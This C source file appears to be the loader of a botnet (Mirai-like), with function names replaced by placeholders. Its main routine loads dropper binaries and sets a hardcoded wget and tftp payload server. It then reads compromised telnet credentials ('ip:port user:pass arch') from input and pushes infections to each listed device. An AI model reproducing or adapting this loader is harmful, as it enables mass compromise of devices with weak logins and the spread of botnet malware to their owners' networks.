#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_4__   TYPE_1__ ;

/* Type definitions */
typedef  int uint8_t ;
typedef  scalar_t__ uint32_t ;
struct telnet_info {int dummy; } ;
typedef  int /*<<< orphan*/  strbuf ;
typedef  int /*<<< orphan*/  pthread_t ;
typedef  int /*<<< orphan*/  ipv4_t ;
struct TYPE_4__ {int /*<<< orphan*/  curr_open; int /*<<< orphan*/  total_input; } ;

/* Variables and functions */
 scalar_t__ FUNC0 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC1 (int /*<<< orphan*/ *) ; 
 scalar_t__ TRUE ; 
 int /*<<< orphan*/  _SC_NPROCESSORS_ONLN ; 
 int /*<<< orphan*/  FUNC2 () ; 
 int /*<<< orphan*/ * FUNC3 (int,int) ; 
 int /*<<< orphan*/ * FUNC4 (char*,int,int /*<<< orphan*/ ) ; 
 char* id_tag ; 
 int /*<<< orphan*/  FUNC5 (char*) ; 
 int /*<<< orphan*/  FUNC6 (struct telnet_info*,int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  FUNC7 (char*,...) ; 
 int /*<<< orphan*/  FUNC8 (int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 TYPE_1__* FUNC9 (int /*<<< orphan*/ ,int,int /*<<< orphan*/ *,int,char*,int,char*) ; 
 int /*<<< orphan*/  FUNC10 (TYPE_1__*,struct telnet_info*) ; 
 int /*<<< orphan*/  FUNC11 (int) ; 
 TYPE_1__* srv ; 
 int /*<<< orphan*/  stats_thread ; 
 int /*<<< orphan*/  stdin ; 
 scalar_t__ FUNC12 (char*) ; 
 int /*<<< orphan*/  FUNC13 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/ * FUNC14 (char*,struct telnet_info*) ; 
 int /*<<< orphan*/  FUNC15 (int) ; 
 int /*<<< orphan*/  FUNC16 (char*) ; 

int FUNC17(int argc, char **args)
{
    pthread_t stats_thrd;
    uint8_t addrs_len;
    ipv4_t *addrs;
    uint32_t total = 0;
    struct telnet_info info;

#ifdef DEBUG
    addrs_len = 1;
    addrs = calloc(4, sizeof (ipv4_t));
    addrs[0] = inet_addr("0.0.0.0");
#else
    addrs_len = 2;
    addrs = FUNC3(addrs_len, sizeof (ipv4_t));

    addrs[0] = FUNC5("192.168.0.1"); // Address to bind to
    addrs[1] = FUNC5("192.168.1.1"); // Address to bind to
#endif

    if (argc == 2)
    {
        id_tag = args[1];
    }

    if (!FUNC2())
    {
        FUNC7("Failed to load bins/dlr.* as dropper\n");
        return 1;
    }

    /*                                                                                   wget address           tftp address */
    if ((srv = FUNC9(FUNC13(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, "100.200.100.100", 80, "100.200.100.100")) == NULL)
    {
        FUNC7("Failed to initialize server. Aborting\n");
        return 1;
    }

    FUNC8(&stats_thrd, NULL, stats_thread, NULL);

    // Read from stdin
    while (TRUE)
    {
        char strbuf[1024];

        if (FUNC4(strbuf, sizeof (strbuf), stdin) == NULL)
            break;

        FUNC16(strbuf);

        if (FUNC12(strbuf) == 0)
        {
            FUNC15(10000);
            continue;
        }

        FUNC6(&info, 0, sizeof(struct telnet_info));
        if (FUNC14(strbuf, &info) == NULL)
            FUNC7("Failed to parse telnet info: \"%s\" Format -> ip:port user:pass arch\n", strbuf);
        else
        {
            if (srv == NULL)
                FUNC7("srv == NULL 2\n");

            FUNC10(srv, &info);
            if (total++ % 1000 == 0)
                FUNC11(1);
        }

        FUNC1(&srv->total_input);
    }

    FUNC7("Hit end of input.\n");

    while(FUNC0(&srv->curr_open) > 0)
        FUNC11(1);

    return 0;
}